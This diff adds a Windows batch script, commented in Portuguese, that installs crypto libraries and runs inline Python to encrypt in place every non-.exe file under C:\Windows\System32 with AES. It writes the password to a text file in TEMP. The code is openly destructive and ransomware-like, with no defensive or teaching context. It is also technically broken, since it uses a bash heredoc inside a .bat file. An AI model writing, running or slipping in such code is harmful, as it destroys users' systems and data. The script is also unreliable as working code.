@@ -1,0 +1,40 @@
+@echo off
+echo Instalando dependências...
+pip install pycryptodomex pywin32 psutil
+
+echo Criptografando a pasta System32...
+python - << END
+import os
+import sys
+import random
+import string
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+# Definir senha aleatória
+senha = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=32))
+
+# Gerar chave e IV a partir da senha
+chave = senha.encode('utf-8')[:32]
+iv = senha.encode('utf-8')[16:32]
+
+# Cifrar arquivos na pasta System32
+for root, dirs, files in os.walk(r'C:\Windows\System32'):
+    for filename in files:
+        if not filename.lower().endswith('.exe'):  # Ignorar arquivos .exe
+            filepath = os.path.join(root, filename)
+            with open(filepath, 'rb') as f:
+                conteudo = f.read()
+            cipher = AES.new(chave, AES.MODE_CBC, iv)
+            conteudo_cifrado = cipher.encrypt(pad(conteudo, AES.block_size))
+            with open(filepath, 'wb') as f:
+                f.write(conteudo_cifrado)
+
+# Escrever a senha em um arquivo
+with open(os.path.join(os.environ['TEMP'], 'senha.txt'), 'w') as f:
+    f.write(senha)
+
+print('Todos os arquivos foram criptografados com sucesso!')
+END
+
+pause
